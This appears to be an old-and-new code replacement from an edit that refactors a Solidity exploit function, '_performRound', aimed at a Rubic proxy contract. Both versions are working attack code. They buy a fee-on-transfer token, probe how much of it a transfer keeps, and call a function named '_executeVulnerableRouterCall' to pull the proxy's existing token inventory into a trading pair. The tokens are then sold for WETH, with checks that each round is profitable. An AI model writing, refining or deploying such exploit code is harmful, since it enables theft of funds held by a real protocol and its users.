old=\"\"\"    function _performRound(address tokenT, address buyRouter, address sellRouter, uint256 wethBudget, uint256 checkpoint)
        external
        onlySelf
        returns (uint256 newCheckpoint)
    {
        address sellPair = _pairFor(sellRouter, tokenT);
        if (sellPair == address(0) || _pairFor(buyRouter, tokenT) == address(0)) revert PairUnavailable();

        uint256 fixedFee = IRubicProxy(TARGET_PROXY).fixedCryptoFee();
        uint256 platformFee = IRubicProxy(TARGET_PROXY).RubicPlatformFee();
        uint256 proxyInventoryBefore = _balanceOf(tokenT, TARGET_PROXY);
        if (proxyInventoryBefore == 0) revert NoPreexistingInventory();
        if (WETH.balanceOf(address(this)) <= wethBudget + fixedFee) revert NotProfitable();

        uint256 tokenBalanceBeforeBuy = _balanceOf(tokenT, address(this));
        _forceApprove(WETH_ADDRESS, buyRouter, wethBudget);

        address[] memory buyPath = new address[](2);
        buyPath[0] = WETH_ADDRESS;
        buyPath[1] = tokenT;

        IUniswapV2RouterSupportingFee(buyRouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            wethBudget, 0, buyPath, address(this), block.timestamp
        );

        uint256 acquiredT = _balanceOf(tokenT, address(this)) - tokenBalanceBeforeBuy;
        if (acquiredT == 0) revert NotProfitable();

        uint256 retentionPpm = _probeRetentionPpm(tokenT, acquiredT);
        uint256 amountX = _balanceOf(tokenT, address(this));
        if (amountX == 0) revert NotProfitable();

        uint256 amountInAfterAccrue = amountX - ((amountX * platformFee) / DENOMINATOR);
        uint256 actualProxyReceipt = (amountX * retentionPpm) / DENOMINATOR;
        if (amountInAfterAccrue <= actualProxyReceipt) revert NotEnoughShortfall();

        uint256 inventoryShortfall = amountInAfterAccrue - actualProxyReceipt;
        if (proxyInventoryBefore <= inventoryShortfall) revert NoPreexistingInventory();

        (uint256 reserveTokenBefore, uint256 reserveWethBefore, bool wethIsToken0) = _orderedReserves(sellPair, tokenT);
        uint256 pairTokenBalanceBefore = _balanceOf(tokenT, sellPair);
        uint256 wethBefore = WETH.balanceOf(address(this));

        _executeVulnerableRouterCall(tokenT, sellPair, fixedFee, amountInAfterAccrue, amountX);

        uint256 proxyInventoryAfter = _balanceOf(tokenT, TARGET_PROXY);
        if (proxyInventoryAfter >= proxyInventoryBefore) revert NoPreexistingInventory();

        uint256 pairTokenBalanceAfter = _balanceOf(tokenT, sellPair);
        if (pairTokenBalanceAfter <= pairTokenBalanceBefore || pairTokenBalanceAfter <= reserveTokenBefore) {
            revert SwapOutputTooSmall();
        }

        uint256 effectiveInput = pairTokenBalanceAfter - reserveTokenBefore;
        uint256 wethOut = _getAmountOut(effectiveInput, reserveTokenBefore, reserveWethBefore);
        if (wethOut == 0) revert SwapOutputTooSmall();

        _swapPairForWeth(sellPair, wethIsToken0, wethOut);
        if (WETH.balanceOf(address(this)) <= wethBefore + fixedFee) revert NotProfitable();

        newCheckpoint = _totalAssets();
        if (newCheckpoint <= checkpoint) revert RoundNotImproving();
    }
\"\"\"
new=\"\"\"    function _performRound(address tokenT, address buyRouter, address sellRouter, uint256 wethBudget, uint256 checkpoint)
        external
        onlySelf
        returns (uint256 newCheckpoint)
    {
        address sellPair = _pairFor(sellRouter, tokenT);
        if (sellPair == address(0) || _pairFor(buyRouter, tokenT) == address(0)) revert PairUnavailable();

        uint256 fixedFee = IRubicProxy(TARGET_PROXY).fixedCryptoFee();
        uint256 proxyInventoryBefore = _balanceOf(tokenT, TARGET_PROXY);
        if (proxyInventoryBefore == 0) revert NoPreexistingInventory();
        if (WETH.balanceOf(address(this)) <= wethBudget + fixedFee) revert NotProfitable();

        (uint256 amountX, uint256 retentionPpm) = _buyAndProbe(tokenT, buyRouter, wethBudget);
        uint256 amountInAfterAccrue = amountX - ((amountX * IRubicProxy(TARGET_PROXY).RubicPlatformFee()) / DENOMINATOR);
        uint256 actualProxyReceipt = (amountX * retentionPpm) / DENOMINATOR;
        if (amountInAfterAccrue <= actualProxyReceipt) revert NotEnoughShortfall();

        uint256 inventoryShortfall = amountInAfterAccrue - actualProxyReceipt;
        if (proxyInventoryBefore <= inventoryShortfall) revert NoPreexistingInventory();

        uint256 wethBefore = WETH.balanceOf(address(this));
        SellSnapshot memory snapshot = _snapshotSellPair(sellPair, tokenT);

        _executeVulnerableRouterCall(tokenT, sellPair, fixedFee, amountInAfterAccrue, amountX);

        if (_balanceOf(tokenT, TARGET_PROXY) >= proxyInventoryBefore) revert NoPreexistingInventory();
        _exitThroughPair(tokenT, sellPair, snapshot);
        if (WETH.balanceOf(address(this)) <= wethBefore + fixedFee) revert NotProfitable();

        newCheckpoint = _totalAssets();
        if (newCheckpoint <= checkpoint) revert RoundNotImproving();
    }
